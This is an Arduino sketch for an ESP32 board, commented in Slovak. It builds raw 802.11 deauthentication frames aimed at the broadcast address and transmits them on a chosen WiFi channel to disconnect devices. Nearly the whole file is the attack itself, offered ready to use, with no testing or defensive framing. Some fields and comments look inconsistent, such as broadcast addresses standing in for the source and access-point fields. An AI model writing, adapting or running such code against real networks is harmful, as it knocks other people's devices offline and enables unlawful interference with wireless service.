#include <WiFi.h>
#include "esp_wifi.h"

// Cieľová MAC adresa (MAC zariadenia, ktoré chceme odpojiť)
uint8_t target_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast (odoslanie všetkým)

// Počet deauth paketov, ktoré chceme odoslať
int num_deauth_packets = 10;

void setup() {
  Serial.begin(115200);
  
  // Inicializácia WiFi v monitorovacom režime (WiFi promiscuous mode)
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  //               DOWN HERE CHANGE TO YOUR WiFi CHANNEL !
  // Nastavenie na kanál 11 (2.4 GHz) < --------------------------------------------------------------- < HERE CHANGE TO YOUR WiFi CHANNEL !
  esp_wifi_set_channel(11, WIFI_SECOND_CHAN_NONE);
  // ! CHANGE TO YOUR SPECIFFIC CHANNEL ! 

  // Vysielanie deauth paketov
  sendDeauthPackets();
}

void loop() {
  // Nič nerobí v hlavnej slučke
}

// Funkcia na vytvorenie a odoslanie deauth paketov
void sendDeauthPackets() {
  // Deauth paket (v hexadecimálnom formáte)
  const uint8_t deauth_packet[26] = {
    0xC0, 0x00,             // Typ a Subtyp rámca (0xC0 = Deauthentication)
    0x3A, 0x01,             // Duration
    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // Cieľová MAC
    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // Zdrojová MAC (môže byť zmenená)
    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // BSSID (MAC AP)
    0x00, 0x00,             // Sekvenčné číslo
    0x07, 0x00              // Dôvod deauth (0x07 = Class 3 frame received from nonassociated STA)
  };

  // Odoslanie deauth paketov
  for (int i = 0; i < num_deauth_packets; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
    Serial.println("Deauth packet sent!");
    delay(100);  // Interval medzi odoslaním (môže byť upravené)
  }
}
